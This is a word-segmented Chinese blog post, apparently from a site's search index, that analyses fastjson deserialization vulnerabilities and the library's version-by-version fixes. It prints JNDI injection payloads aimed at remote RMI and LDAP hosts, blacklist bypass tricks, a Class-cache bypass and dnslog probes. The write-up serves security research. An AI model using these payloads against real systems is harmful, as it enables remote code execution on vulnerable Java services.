\u539f\u7406 \uff0c \u6211\u4eec \u53ea \u9700\u8981 \u586b\u5145   dataSource   \u548c   autoCommit   \u5c31 \u53ef\u4ee5 \u89e6\u53d1 \u8fd9\u91cc \u7684 JNDI \u6ce8\u5165 \u3002   {   \" @ type \"   :   \" com . sun . rowset . JdbcRowSetImpl \"   ,   \" dataSourceName \"   :   \" rmi : / / evil : 1099 / test \"   ,   \" autoCommit \"   :   true   }   \u8fd8\u6709 \u5f88\u591a \u5176\u4ed6 \u7684 \u53ef\u4ee5 \u7528\u6765 JNDI \u6ce8\u5165 \u7684 \u5bf9\u8c61 \uff0c \u6bd4\u5982   org . hibernate . jmx . StatisticsService   \u7684   setSessionFactoryJNDIName   \u51fd\u6570 \uff0c \u539f\u7406 \u4e00\u6837 \u4e0d\u518d \u53d9\u8ff0 \u3002   ( 3 ) .   Tomcat   dbcp   BasicDataSource   \u540c 1 \u4e2d \u7684 TemplateImpl \uff0c BasicDataSource \u4e5f \u53ef\u4ee5 \u8f7d\u5165 \u4efb\u610f \u7684 \u5bf9\u8c61 \u6765 \u6267\u884c \u4efb\u610f \u4ee3\u7801 \u3002 \u5148 \u6765\u8bb2 \u4e00\u4e0b \u4ed6 \u7684 \u539f\u7406   \u524d\u9762 \u7684 \u57fa\u7840 \u77e5\u8bc6 \u57fa\u7840\u77e5\u8bc6 \u91cc \u63d0\u5230 \u4e86 \u6211\u4eec \u53ef\u4ee5 \u8c03\u7528 \u7b26\u5408 \u6761\u4ef6 \u7b26\u5408\u6761\u4ef6 \u7684 getters \uff0c \u5728   BasicDataSource   \u5b58\u5728 \u4e00\u4e2a   getConnection   \u51fd\u6570 \uff0c \u4ed6 \u4e3b\u8981 \u8c03\u7528   createConnectionFactory   \u5728   createConnectionFactory   \u51fd\u6570 \u4f7f\u7528 Class . forName \u52a0\u8f7d \u7c7b   \u8fd9\u90e8 \u90e8\u5206 \u8fd9\u90e8\u5206 driverClassName \u548c driverClassLoader \u662f \u53ef\u63a7 \u7684 \uff0c \u8fd9\u65f6 \u65f6\u5019 \u8fd9\u65f6\u5019 \u6211\u4eec \u8981 \u7528\u5230 \u7684 \u662f   com . sun . org . apache . bcel . internal . util . ClassLoader   \uff0c \u8fd9\u4e2a ClassLoader \u53ef\u4ee5 \u4ece classname \u4e2d \u63d0\u53d6 \u51fa BCEL \u683c\u5f0f \u7684 class \u5b57\u8282 \u7801 \uff0c \u5e76 \u8c03\u7528 defineClass \u8fdb\u884c \u8f7d\u5165   \u8fd9\u91cc \u6211\u4eec \u53ef\u4ee5 \u5199 \u4e00\u4e2a \u7528 \u4e86 \u9759\u6001 \u5757 \u7684 \u7c7b\u6765 \u6267\u884c \u4ee3\u7801 \u3002   0x03   Fastjson \u5386\u53f2 \u7248\u672c \u4fee\u590d \u63aa\u65bd   \u8fd9 \u4e00\u90e8 \u90e8\u5206 \u4e00\u90e8\u5206 \u4e3b\u8981 \u8bb2\u8ff0 \u51e0\u4e2a \u91cd\u8981 \u7248\u672c \u7684 \u5b89\u5168 \u66f4\u65b0 \u5b89\u5168\u66f4\u65b0   ( 1 ) .   fastjson   = =   1.2 . 25   \u9ed8\u8ba4 \u5173\u95ed   AutoType   \uff0c \u9700\u8981 \u624b\u52a8 \u5f00\u542f   @ type   \u7684 \u652f\u6301 \uff0c \u89c1   enable _ autotype   com . alibaba . fastjson . parser . DefaultJSONParser # parseObject ( java . util . Map ,   java . lang . Object )   \u5f53 \u9047\u5230   @ type   \u65f6 \uff0c \u4f1a\u5148   com . alibaba . fastjson . parser . ParserConfig # checkAutoType   \u3002 \u8be5 \u51fd\u6570 \u7684 \u4e00\u4e2a \u4e3b\u8981 \u903b\u8f91 \uff08 1.2 . 25 \u7248\u672c \uff09   \u5f00\u542f \u4e86   AutoType   \u65f6 \uff0c \u4f1a\u8fc7 \u4e00\u6b21 \u9ed1\u540d \u540d\u5355 \u9ed1\u540d\u5355 \u548c \u540d\u5355 \u767d\u540d\u5355 \u68c0\u6d4b \uff08 \u5148 \u68c0\u6d4b \u540d\u5355 \u767d\u540d\u5355 \uff0c \u540e \u68c0\u6d4b \u9ed1\u540d \u540d\u5355 \u9ed1\u540d\u5355 \uff09 \u3002   \u4f18\u5148 \u8f7d\u5165 \u4eba\u5de5 \u914d\u7f6e \u7684 \u540d\u5355 \u767d\u540d\u5355 \u7c7b \uff0c \u5e76 \u5bf9 \u9ed1\u540d \u540d\u5355 \u9ed1\u540d\u5355 \u7c7b \u7206\u51fa \u5f02\u5e38 \uff1b   \u8fd9\u91cc \u5148 \u5ffd\u7565 \u672a \u5f00\u542f   AutoType   \u65f6 \u7684 \u68c0\u6d4b \u5904\u7406   \u524d\u9762 \u7684 \u60c5\u51b5 \u90fd \u4e0d \u7b26\u5408 \uff0c \u5e76\u4e14 \u5f00\u542f \u4e86   AutoType   \uff0c \u5219 \u5c1d\u8bd5 \u53bb \u8f7d\u5165 \u4efb\u610f \u7c7b \uff0c \u4f46\u662f \u4e0d \u53ef\u4ee5 \u8f7d\u5165 ClassLoader \u548c DataSource \u7684 \u5b50\u7c7b   \u8fd9\u91cc \u8f7d\u5165 \u7684 \u65b9\u6cd5 \u7528 \u7684 \u90fd \u662f   TypeUtils . loadClass   \uff0c \u6765\u770b \u4e00\u4e0b \u4ed6 \u7684 \u4e00\u4e2a \u5904\u7406   \u9996\u5148 \u4ed6 \u5bf9\u4e8e   Lxxx . class . xxx ;   \u7684 \u7c7b \u8868\u793a \u65b9\u6cd5 \u505a   L   ,   ;   \u7684 \u5254\u9664 \uff0c \u9012\u5f52 \u8c03\u7528 loadClass \u53bb \u8c03\u7528 \u5185\u90e8 \u7684 \u5177\u4f53 \u7c7b   \u540e\u7eed \u7684 \u8c03\u7528 \u65b9\u6cd5 \u4e3a \u4f7f\u7528   AppClassLoader . loadClass   \u6216   Class . forName   \u53bb \u52a0\u8f7d \u7c7b   \u5f00\u542f   AutoType   \u7684 \u60c5\u51b5 \u4e0b \u7ed5\u8fc7 \u9ed1\u540d \u540d\u5355 \u9ed1\u540d\u5355 \u68c0\u6d4b   \u6839\u636e \u4e0a\u9762 \u7684 \u5206\u6790 \uff0c \u5982\u679c \u5f00\u542f \u4e86   AutoType   \uff0c \u90a3\u4e48 \u5982\u679c \u662f \u5728 \u540d\u5355 \u767d\u540d\u5355 \u91cc \u7684 \u7c7b \uff0c \u76f4\u63a5 \u52a0\u8f7d \uff0c \u5bf9\u4e8e \u5728 \u9ed1\u540d \u540d\u5355 \u9ed1\u540d\u5355 \u5185 \u7684 \u7c7b \u76f4\u63a5 \u629b\u51fa \u5f02\u5e38 \u3002   \u800c \u9ed1\u540d \u540d\u5355 \u9ed1\u540d\u5355 \u7684 \u68c0\u6d4b \u65b9\u5f0f \u662f \u53bb \u5339\u914d \u5f53\u524d \u7684 \u7c7b\u540d   class . startsWith ( deny )   \u800c \u5728 \u8fd9\u4e2a \u9ed1\u540d \u540d\u5355 \u9ed1\u540d\u5355 \u91cc \u663e\u7136 \u5e76 \u6ca1\u6709 \u8003\u8651 \u5230   TypeUtils . loadClass   \u5b9e\u73b0 \u4e2d \uff0c \u5bf9\u4e8e   Lxxxx . class . xxx ;   \u7684 \u5904\u7406 \u3002   \u901a\u8fc7   Lxxxxx ;   \u7684 \u65b9\u5f0f   startsWith   \u6ca1 \u529e\u6cd5 \u6b63\u5e38 \u5339\u914d \u51fa\u6765 \uff0c \u6240\u4ee5 \u6211\u4eec \u53ef\u4ee5 \u7ed5\u8fc7 \u9ed1\u540d \u540d\u5355 \u9ed1\u540d\u5355 \u7684 \u68c0\u6d4b \u3002   ( 2 ) .   fastjson   = =   1.2 . 42   \u5728 \u8fd9\u4e2a \u7248\u672c \uff0c \u5bf9 \u4e0a\u9762 \u7684 \u9ed1\u540d \u540d\u5355 \u9ed1\u540d\u5355 \u68c0\u6d4b \u7ed5\u8fc7 \u505a \u4e86 \u4fee\u590d \uff0c \u5e76\u4e14 \u5c06 \u9ed1\u540d \u540d\u5355 \u9ed1\u540d\u5355 \u91cc \u7684 \u7c7b\u578b \u8fdb\u884c hash \u5904\u7406 \uff0c \u589e\u52a0 \u4e86 \u5206\u6790 \u96be\u5ea6 \uff1b   \u5bf9\u4e8e \u524d\u9762   Lxxxxx ;   \u7684 \u7ed5\u8fc7 \uff0c 42 \u7248\u672c \u6dfb\u52a0 \u4e86 \u4ee5\u4e0b \u4ee3\u7801 \u6765 \u5254\u9664 \uff08 \u56e0\u4e3a \u9ed1\u540d \u540d\u5355 \u9ed1\u540d\u5355 \u5df2\u7ecf \u53d8\u6210 \u4e86 hash \u6bd4\u8f83 \u7684 \u65b9\u5f0f \uff0c \u8fd9\u91cc   L ;   \u90fd \u4ee5 \u8fd9\u79cd \u65b9\u5f0f \u6765 \u786e\u8ba4 \uff09   \u4f46\u662f \u8fd9\u91cc \u7684 \u5904\u7406 \u6cbb\u6807 \u4e0d\u6cbb \u6cbb\u672c \u6cbb\u6807\u4e0d\u6cbb\u672c \uff0c \u6211\u4eec \u4f7f\u7528   LLxxxxx ; ;   \u8fd9\u79cd \u65b9\u5f0f \u5c31 \u53ef\u4ee5 \u7ed5\u8fc7 \u3002   \u9664\u6b64 \u4e4b\u5916 \u9664\u6b64\u4e4b\u5916 \uff0c \u7531\u4e8e \u73b0\u5728 \u7684 \u9ed1\u540d \u540d\u5355 \u9ed1\u540d\u5355 \u53d8\u6210 \u4e86 hash \u8ba1\u7b97 \u7684 \u65b9\u5f0f \uff0c \u7ed9 \u6211\u4eec \u5206\u6790 \u589e\u52a0 \u4e86 \u4e0d\u5c11 \u96be\u5ea6 \uff0c \u4e0d\u8fc7 \u6709 \u5927\u4f6c \u5bf9 \u9ed1\u540d \u540d\u5355 \u9ed1\u540d\u5355 hash \u505a \u4e86 \u8fd8\u539f \u89c1   fastjson - blacklist   ( 3 ) .   fastjson   = =   1.2 . 43   \u8fd9\u4e2a \u7248\u672c \u4e3b\u8981 \u4fee\u590d \u4e86 \u4e0a\u9762   LLxxxx ; ;   \u7684 \u65b9\u5f0f   \u505a \u4e86 \u4e24\u6b21 \u68c0\u6d4b \uff0c \u5982\u679c \u78b0\u4e0a   LLxxxxx ; ;   \u7684 \u65b9\u5f0f \u5219 \u76f4\u63a5 \u7206\u51fa \u5f02\u5e38   ( 4 ) .   fastjson   = =   1.2 . 48   \u4fee\u590d \u524d \u7684 \u7248\u672c   \u5728 48 \u7248\u672c \u4e4b\u524d \uff0c   checkAutoType   \u8fd8 \u5b58\u5728 \u8fd9\u6837 \u4e00\u4e2a \u903b\u8f91 \uff08 \u4ee5 1.2 . 47 \u4e3a\u4f8b \uff09   \u5f53 \u5f00\u542f   AutoType   \u65f6 \uff0c \u5982\u679c mappings \u91cc\u9762 \u5b58\u5728 \u8fd9\u4e2a \u7c7b \uff0c \u90a3\u4e48 \u5c31\u7b97 \u8fd9\u4e2a \u7c7b \u5728 \u9ed1\u540d \u540d\u5355 \u9ed1\u540d\u5355 \u91cc \uff0c \u4e5f \u5141\u8bb8 \u4ed6 \u8fdb\u884c \u4e0b \u4e00\u6b65 \u64cd\u4f5c   PS \uff1a \u8fd9\u91cc \u7684 mappings \u662f fastjson \u63d0\u65e9 \u8f7d\u5165 \u7684 \u4e00\u4e9b \u7f13\u5b58 \u7c7b   \u540e\u7eed \u5982\u679c \u80fd \u4ece mappings \u91cc\u9762 \u5f97\u5230 \u8fd9\u4e2a \u7c7b \uff0c \u5c31 \u76f4\u63a5 \u8fd4\u56de \u3002 \u90a3\u4e48 \u6211\u4eec \u6ca1\u6709 \u6709\u6ca1\u6709 \u4ec0\u4e48 \u65b9\u6cd5 \u5c06 \u6211\u4eec \u9700\u8981 \u7684 \u7c7b \u52a0\u5165 \u5230 \u8fd9\u4e2a mappings \u91cc \u5462 \uff1f   \u5148 \u6765\u770b \u4e00\u4e0b   deserializers . findClass   \uff0c \u5728   deserializers   \u91cc\u9762 \u9884\u5148 \u586b\u5145 \u4e86 \u4e00\u4e9b \u7c7b \u4e0e\u5176 \u53cd \u5e8f\u5217 \u5e8f\u5217\u5316 \u5668 \u7684 \u5b9e\u4f8b   \u8fd9\u91cc \u6211\u4eec \u4e3b\u8981 \u5173\u6ce8 \u4e00\u4e0b   Class . class   \uff0c \u4ed6 \u6240 \u5bf9\u5e94 \u7684 \u53cd \u5e8f\u5217 \u5e8f\u5217\u5316 \u5668\u4e3a   MiscCodec   \uff0c   checkAutoType   \u68c0\u6d4b \u8fc7\u540e \uff0c \u540e\u7eed \u5c06 \u8c03\u7528 \u53cd \u5e8f\u5217 \u5e8f\u5217\u5316 \u5668 \u7684   deserialze   \u51fd\u6570 \u3002 \u6765 \u770b\u770b MiscCodec \u7684 \u8fd9\u4e2a \u51fd\u6570 \u5bf9\u4e8e   Class . class   \u7684 \u5904\u7406   \u4ed6 \u8c03\u7528 \u4e86   TypeUtils . loadClass   \u51fd\u6570 \uff0c \u524d\u9762 \u6211\u4eec \u8bb2\u8fc7 \uff0c \u4ed6 \u5c06 \u4f7f\u7528   ClassLoader . loadClass   \u6216   Class . forName   \u6765 \u8f7d\u5165 \u7c7b \uff0c \u5728 \u8fd9 \u4e00 \u8fc7\u7a0b \u4e2d \uff0c \u6d89\u53ca \u5230 \u4e86   mappings   \u7684 \u64cd\u4f5c   \u8fd9\u91cc \u7684   cache   \u9ed8\u8ba4 \u4e3a   true   \uff0c \u6240\u4ee5 \u8fd9\u91cc \u4f1a \u76f4\u63a5 \u5c06 \u8f7d\u5165 \u540e \u7684 \u5bf9\u8c61 \u586b\u5165   mappings   \u6839\u636e \u6211\u4eec \u524d\u9762 \u7684 \u5206\u6790 \uff0c \u5982\u679c \u5f53\u524d   mappings   \u91cc \u5b58\u5728 \u53ef\u63a7 \u7684 \u7c7b \uff0c \u90a3\u4e48 \u4e0d\u7ba1 \u5f00 \u6ca1 \u5f00\u542f   AutoType   \uff0c \u90fd \u4f1a \u8fdb\u884c \u7c7b \u8fd8\u539f \uff1b \u540c\u65f6 \u6211\u4eec \u5229\u7528   Class . class   \u53ef\u4ee5 \u5411   mappings   \u586b\u5145 \u4efb\u610f \u7c7b \uff0c \u8fd9 \u5bfc\u81f4 \u7ed5\u8fc7 \u4e86 \u524d\u9762 \u7684 \u68c0\u6d4b \uff1b   / /   \u4e3e\u4e2a \u4f8b\u5b50   json   =   \" { \"   +   / /   \u7528 Class \u8f7d\u5165 com . sun . rowset . JdbcRowSetImpl \uff0c \u5e76 \u7f13\u5b58 \u5230 mappings   \" { \\ \" @ type \\ \" : \\ \" java . lang . Class \\ \" , \\ \" val \\ \" : \\ \" com . sun . rowset . JdbcRowSetImpl \\ \" } , \"   +   / /   \u540e\u7eed \u4f7f\u7528 mappings \u91cc \u7684 com . sun . rowset . JdbcRowSetImpl \u6765 \u8fd8\u539f \u5bf9\u8c61   \" { \\ \" @ type \\ \" :   \\ \" com . sun . rowset . JdbcRowSetImpl \\ \" , \"   +   \" \\ \" dataSourceName \\ \" :   \\ \" ldap : / / localhost : 1389 / Exploit \\ \" , \"   +   \" \\ \" autoCommit \\ \" :   true } \"   +   \" } \"   ;   \u4fee\u590d \u540e \u7684 \u7248\u672c   \u5728 1.2 . 48 \u7248\u672c \u4e0a \u5bf9 \u5176 \u8fdb\u884c \u4e86 \u4fee\u590d   \u5728   MiscCodec   \u5bf9 Class \u7684 \u5904\u7406 \u4e2d \uff0c \u4fee\u6539 \u4e86   cache = false   \u5e76\u4e14 \u5bf9\u4e8e   TypeUtils . loadClass   \u91cc \u7684   mappings   \u64cd\u4f5c \u90fd \u4f9d\u8d56 \u8d56\u4e8e \u4f9d\u8d56\u4e8e   cache   \uff0c \u5982\u679c \u4e3a   false   \u5219 \u4e0d \u6dfb\u52a0 \u5230   mappings   \u91cc \uff08 \u5728 \u524d\u9762 \u7684 \u7248\u672c \u91cc   Class . forName   \u90e8\u5206 \u5e76 \u4e0d \u4f9d\u8d56 cache \uff0c 48 \u7248\u672c \u4e4b\u540e \u589e\u52a0 \u4e86 \u5bf9 cache \u7684 \u5224\u65ad \uff09   \u4e0e\u6b64 \u540c\u65f6 \u4e0e\u6b64\u540c\u65f6 \uff0c   java . lang . Class   \u4e5f \u88ab \u52a0\u5165 \u5230 \u4e86 \u9ed1\u540d \u540d\u5355 \u9ed1\u540d\u5355 \u91cc\u9762   ( 5 ) .   \u540e\u7eed \u7248\u672c   \u540e\u7eed \u7248\u672c \u7684 \u7ed5\u8fc7 \u4e3b\u8981 \u56f4\u7ed5 \u5728 \uff1a   \u5f00\u542f   AutoType   \uff0c \u7ed5\u8fc7 \u9ed1\u540d \u540d\u5355 \u9ed1\u540d\u5355 \u68c0\u6d4b   \u5229\u7528   deserializers   \u91cc\u9762 \u7684 \u7c7b ( \u8ddf   Class . class   \u4e00\u4e2a \u539f\u7406 )   \u6700\u65b0 \u65b0\u7248 \u6700\u65b0\u7248 1.2 . 68 \u5f15\u5165 \u4e86   safeMode   \uff0c \u5728   checkAutoType   \u91cc \u6dfb\u52a0 \u4e86 \u4e0b\u9762 \u5224\u65ad \uff0c \u5982\u679c \u5f00\u542f \u4e86 safemode \uff0c \u90a3\u4e48 \u5c06 \u4e0d \u5141\u8bb8 \u8fdb\u884c   @ type   \u4e0d\u8fc7 \u8fd9\u4e2a \u5e76 \u4e0d\u662f \u9ed8\u8ba4 \u5f00\u542f \u7684 \uff0c \u9700\u8981 \u4eba\u5de5 \u53bb \u914d\u7f6e \u3002   ( 6 ) .   \u540e\u7eed \u7248\u672c \u89c9\u5f97 \u6709\u610f \u610f\u601d \u6709\u610f\u601d \u7684 \u5229\u7528   fastjson   <   1.2 . 60   dos   Fastjson - 1 - 2 - 60 - Dos   \u4f7f\u7528 dnslog \u6765 \u68c0\u6d4b fastjson \u6f0f\u6d1e   https : / / github . com / alibaba / fastjson / issues / 3077   \u8fd9\u91cc \u7684 \u539f\u7406 \u8ddf   Class . class   \u662f \u4e00\u6837 \u7684 \uff0c \u53ea\u662f \u6362\u6210 \u4e86   java . net . URL   \u3001   java . net . Inet4Address   \u3001   java . net . Inet6Address   \uff0c \u7531 MiscCodec \u5904\u7406 \u65f6\u4f1a \u53bb \u89e6\u53d1 dns \u67e5\u8be2   \u5f53\u7136 \u8fd9\u91cc \u7684 \u89e6\u53d1 URL \u7684 \u89e6\u53d1 \u7528 \u7684 ysoserial \u91cc\u9762 \u7684 URLDNS \u7684 \u65b9\u5f0f \uff0c \u7531 hashcode \u53bb \u89e6\u53d1 \uff1b   { \" @ type \" : \" java . net . Inet4Address \" , \" val \" : \" dnslog \" }   { \" @ type \" : \" java . net . Inet6Address \" , \" val \" : \" dnslog \" }   { { \" @ type \" : \" java . net . URL \" , \" val \" : \" http : / / s81twxdise25yxjinqaar74iq9wzko . burpcollaborator . net \" } : \" aaa \" }   0x04   \u603b\u7ed3   \u5230 \u8fd9\u91cc fastjson \u76f8\u5173 \u7684 \u77e5\u8bc6 \u77e5\u8bc6\u70b9 \u5c31 \u68b3\u7406 \u7ed3\u675f \u4e86 \uff0c \u8fd9 \u5176\u4e2d \u5f00\u53d1 \u5f00\u53d1\u8005 \u4e0e \u5b89\u5168 \u7814\u7a76 \u4eba\u5458 \u7684 \u653b\u9632 \u4ea4\u4e92 \u771f\u662f \u4ee4\u4eba \u79f0 \u5feb \uff01 \u540e\u7eed \u5982\u679c \u6709 \u5176\u4ed6 \u7684 \u7ed5\u8fc7 \uff0c \u8fd8\u4f1a \u7ee7\u7eed \u5199\u4e0b \u4e0b\u53bb \u5199\u4e0b\u53bb \u3002   \u603b\u7ed3 \u4e00\u4e0b fastjson \u5229\u7528 \u4e2d \u7684 \u7279\u8272 \uff1a   \u53cd \u5e8f\u5217 \u5e8f\u5217\u5316 \u65f6 \u4e3b\u52a8 \u89e6\u53d1 \u7b26\u5408 \u6761\u4ef6 \u7b26\u5408\u6761\u4ef6 \u7684 setters \u548c getters \uff0c \u5176\u4e2d \u4f7f\u7528 parse \u548c parseObject \u51fd\u6570 \uff0c \u5728 getter \u5229\u7528 \u4e0a parseObject \u7684 \u9650\u5236 \u66f4 \u4f4e \u4e00\u70b9 \uff1b \u4f46\u662f \u8fd9\u91cc \u6211\u4eec \u53ef\u4ee5 \u5229\u7528 \u672c\u6587 \u7684 \u4e24\u79cd \u65b9\u6cd5 \u5c06 parse \u7684 \u8c03\u7528 \u6548\u679c \u8f6c\u5316 \u4e3a parseObject   com . sun . org . apache . bcel . internal . util . ClassLoader   \u662f \u4e2a \u597d \u4e1c\u897f   fastjson \u7684 \u9ed1\u540d \u540d\u5355 \u9ed1\u540d\u5355 \u7ed5\u8fc7 \u6765\u770b \uff0c \u57fa\u672c \u57fa\u672c\u4e0a \u627e \u7684 \u90fd \u662f jndi \u76f8\u5173 \u7684 \u5229\u7528 \uff0c \u6216\u8bb8 \u53ef\u4ee5 \u6269\u5c55 \u4e00\u4e9b \u5176\u4ed6 \u7684 \uff1f   \u6709\u65f6 \u65f6\u5019 \u6709\u65f6\u5019 \u5f00\u53d1 \u5f00\u53d1\u8005 \u7406\u89e3 \u4e0d \u5230\u4f4d \uff0c \u6253 \u5f97 \u8865\u4e01 \u53ef\u4ee5 \u8f7b\u677e \u88ab \u7ed5\u8fc7 \uff0c \u6240\u4ee5 \u9700\u8981 \u7d27\u76ef \u8865\u4e01 \u7684 \u60c5\u51b5","title":"\u6d45\u8c08 fastjson \u53cd \u5e8f\u5217\u5316 \u6f0f\u6d1e"},{"location":"blog/2020/talk-about-fastjson-deserialization-20200413/#0x00","text":"\u6700\u8fd1 \u53c8 \u78b0\u4e0a \u4e86 fastjson \u7684 \u9898\u76ee \uff0c \u60f3\u7740 \u662f \u65f6\u5019 \u5206\u6790 \u4e00\u6ce2 \u8fd9\u4e2a \u6f0f\u6d1e \u4e86 \uff0c \u8ddf\u4e0a \u5e08\u5085 \u4eec \u7684 \u811a\u6b65 \u3002","title":"0x00   \u524d\u8a00"},{"location":"blog/2020/talk-about-fastjson-deserialization-20200413/#0x01","text":"","title":"0x01   \u57fa\u7840\u77e5\u8bc6"},{"location":"blog/2020/talk-about-fastjson-deserialization-20200413/#1-fastjson","text":"fastjson \u662f \u963f\u91cc \u5df4\u5df4 \u963f\u91cc\u5df4\u5df4 \u7684 \u5f00\u6e90 JSON \u89e3\u6790 \u5e93 \uff0c \u5b83 \u53ef\u4ee5 \u89e3\u6790 JSON \u683c\u5f0f \u7684 \u5b57\u7b26 \u5b57\u7b26\u4e32 \uff0c \u652f\u6301 \u5c06 Java   Bean \u5e8f\u5217 \u5e8f\u5217\u5316 \u4e3a JSON \u5b57\u7b26 \u5b57\u7b26\u4e32 \uff0c \u4e5f \u53ef\u4ee5 \u4ece JSON \u5b57\u7b26 \u5b57\u7b26\u4e32 \u53cd \u5e8f\u5217 \u5e8f\u5217\u5316 \u5230 JavaBean \u3002   \u5148 \u6765\u770b \u4e00\u4e2a \u7b80\u5355 \u7684 \u4f8b\u5b50   public   class   Phone   {   public   String   phoneNumber   ;   public   Phone   ( )   {   }   public   Phone   (   String   phoneNumber   )   {   this   .   phoneNumber   =   phoneNumber   ;   }   @ Override   public   String   toString   ( ) {   return   this   .   phoneNumber   ;   }   }   public   class   NewPhone   extends   Phone   {   public   String   location   ;   public   NewPhone   ( ) {   }   public   NewPhone   (   String   phoneNumber   ,   String   location   )   {   this   .   phoneNumber   =   phoneNumber   ;   this   .   location   =   location   ;   }   @ Override   public   String   toString   ( ) {   return   this   .   phoneNumber   +   \" : \"   +   this   .   location   ;   }   }   public   class   Person   {   public   String   name   ;   public   Phone   phone   ;   public   Person   ( )   {   }   public   Person   (   String   name   ,   Phone   phone   )   {   this   .   name   =   name   ;   this   .   phone   =   phone   ;   }   @ Override   public   String   toString   ( ) {   return   name   +   \" : \"   +   phone   ;   }   }   \u4e0a\u9762 \u5305\u62ec \u4e86 3 \u4e2a \u7b80\u5355 \u7684 \u5bf9\u8c61 Person \u3001 Phone \u4ee5\u53ca NewPhone \uff0c \u6211\u4eec \u7528 fastjson \u5c06 Person \u5bf9\u8c61 \u8f6c\u5316 \u5316\u6210 \u8f6c\u5316\u6210 \u4e00\u4e2a json \u5b57\u7b26 \u5b57\u7b26\u4e32 \uff0c \u5e76 \u8fd8\u539f   Phone   phone   =   new   Phone   (   \" 1234567890 \"   ) ;   Person   person   =   new   Person   (   \" john \"   ,   phone   ) ;   String   json   =   JSON   .   toJSONString   (   person   ) ;   System   .   out   .   println   (   json   ) ;   Person   p   =   JSON   .   parseObject   (   json   ,   Person   .   class   ) ;   System   .   out   .   println   (   p   ) ;   / /   output   / /   { \" name \" : \" john \" , \" phone \" : { \" phoneNumber \" : \" 1234567890 \" } }   / /   john : 1234567890   \u8c03\u7528 fastjson \u7684 toJSONString \u53ef\u4ee5 \u8f7b\u6613 \u5730 \u5c06 object \u8f6c\u5316 \u4e3a json \u5b57\u7b26 \u5b57\u7b26\u4e32 \uff0c \u4e5f \u53ef\u4ee5 \u7528 parseObject \u5c06 json \u5b57\u7b26 \u5b57\u7b26\u4e32 \u8fd8\u539f \u51fa\u6765 \u3002 \u4f46\u662f \u8fd9\u91cc \u6709 \u4e00\u4e2a \u9650\u5236 \u5c31\u662f   Phone   phone   =   new   NewPhone   (   \" 1234567890 \"   ,   \" China \"   ) ;   Person   person   =   new   Person   (   \" john \"   ,   phone   ) ;   String   json   =   JSON   .   toJSONString   (   person   ) ;   System   .   out   .   println   (   json   ) ;   Person   p   =   JSON   .   parseObject   (   json   ,   Person   .   class   ) ;   System   .   out   .   println   (   p   ) ;   / /   output   / /   { \" name \" : \" john \" , \" phone \" : { \" location \" : \" China \" , \" phoneNumber \" : \" 1234567890 \" } }   / /   john : 1234567890   \u5728 \u4e0a\u9762 \u7684 \u5199\u6cd5 \u4e2d \uff0c \u7531\u4e8e fastjson \u4e0d \u77e5\u9053 \u9700\u8981 \u8fd8\u539f \u7684 Person \u7684 Phone \u662f \u672c\u8eab \u8fd8\u662f \u5b50\u7c7b NewPhone \uff0c \u9762\u5bf9 \u8fd9\u79cd \u591a\u6001 \u65b9\u5f0f \uff0c fastjson \u8fd8\u539f \u662f \u7236\u7c7b \uff0c \u800c \u4e0d\u662f \u5b50\u7c7b NewPhone \u3002 \u8fd9 \u610f\u5473 \u610f\u5473\u7740 \u6211\u4eec \u4e22\u5931 \u4e86 Json \u5b57\u7b26 \u5b57\u7b26\u4e32 \u4e2d phone \u7684 location \u5b57\u6bb5 \u3002 \u8fd9 \u663e\u7136 \u662f \u4e0d\u53ef \u5fcd\u53d7 \u7684 \uff0c \u6240\u4ee5 fastjson \u7ed9 \u6211\u4eec \u63d0\u4f9b \u4e86 \u6307\u5b9a \u8fd8\u539f \u7c7b \u7684 \u5b57 \u6bb5   @ type   \u65b9\u6cd5   Phone   phone   =   new   NewPhone   (   \" 1234567890 \"   ,   \" China \"   ) ;   Person   person   =   new   Person   (   \" john \"   ,   phone   ) ;   String   json   =   JSON   .   toJSONString   (   person   ,   SerializerFeature   .   WriteClassName   ) ;   System   .   out   .   println   (   json   ) ;   Person   p   =   JSON   .   parseObject   (   json   ,   Person   .   class   ) ;   System   .   out   .   println   (   p   ) ;   / /   output   / /   { \" @ type \" : \" org . vultest . base . Person \" , \" name \" : \" john \" , \" phone \" : { \" @ type \" : \" org . vultest . base . NewPhone \" , \" location \" : \" China \" , \" phoneNumber \" : \" 1234567890 \" } }   / /   john : 1234567890 : China   \u901a\u8fc7 \u5728 toJSONString \u7684 \u65f6\u5019 \u6307\u5b9a SerializerFeature \uff08 SerializerFeature . WriteClassName \uff09 \uff0c \u4f7f\u5f97 \u8f6c\u5316 \u540e \u7684 json \u5b57\u7b26 \u5b57\u7b26\u4e32 \u591a \u4e86   @ type   \u5b57 \u6bb5 \u3002 \u8fd9\u4e2a \u5b57 \u6bb5 \u6307\u4ee3 \u4e86 \u5f53\u524d \u7c7b \u7684 class \uff0c \u907f\u514d \u4e86 \u4e0a\u9762 \u7684 \u5b50\u7c7b \u4e22\u5931 \u5b57\u6bb5 \u7684 \u95ee\u9898 \u3002 \u6bd4\u5982 \u4e0a\u9762 \u76f4\u63a5 \u6307\u5b9a \u4e86 Person \u5bf9\u8c61 \u7684 phone \u5c5e\u6027 \u7684 \u7c7b \u662f NewPhone \uff0c \u8fd8\u539f \u540e \u6210\u529f \u6253\u5370 \u51fa location \u3002   \u5230 \u4e86 \u8fd9\u91cc \uff0c \u6211\u4eec \u53ef\u4ee5 \u601d\u8003 \u4e00\u4e0b \uff0c \u5982\u679c   @ type   \u88ab \u6307\u5b9a \u4e3a \u67d0 \u6076\u610f \u7684 \u7c7b \uff0c \u662f\u5426 \u4f1a \u5bfc\u81f4 \u4efb\u610f \u4ee3\u7801 \u6267\u884c \u4ee3\u7801\u6267\u884c \u7684 \u6f0f\u6d1e \uff1f","title":"( 1 ) .   fastjson \u7684 \u57fa\u7840 \u4f7f\u7528"},{"location":"blog/2020/talk-about-fastjson-deserialization-20200413/#2fastjson","text":"\u8fd9\u91cc \u76f4\u63a5 \u53c2\u8003 https : / / paper . seebug . org / 994 /   \u7528 \u4e00\u4e0b \u5ed6\u5927 \u7684 \u6d41\u7a0b \u6d41\u7a0b\u56fe   \u5177\u4f53 \u7684 \u5206\u6790 \u8fc7\u7a0b \u770b \u4e0a\u9762 \u7684 \u90a3 \u6587\u7ae0 \u7bc7\u6587\u7ae0 \u5373\u53ef \uff0c \u8fd9\u91cc \u63d0 \u4e00\u4e0b \u5c06 ASM \u52a8\u6001 \u751f\u6210 \u7684 \u4ee3\u7801 dump \u51fa\u6765 \u7684 \u65b9\u6cd5   \u5728 \u5206\u6790 \u8fc7\u7a0b \u4e2d \uff0c ASM \u52a8\u6001 \u751f\u6210 \u4e86 \u76f8\u5e94 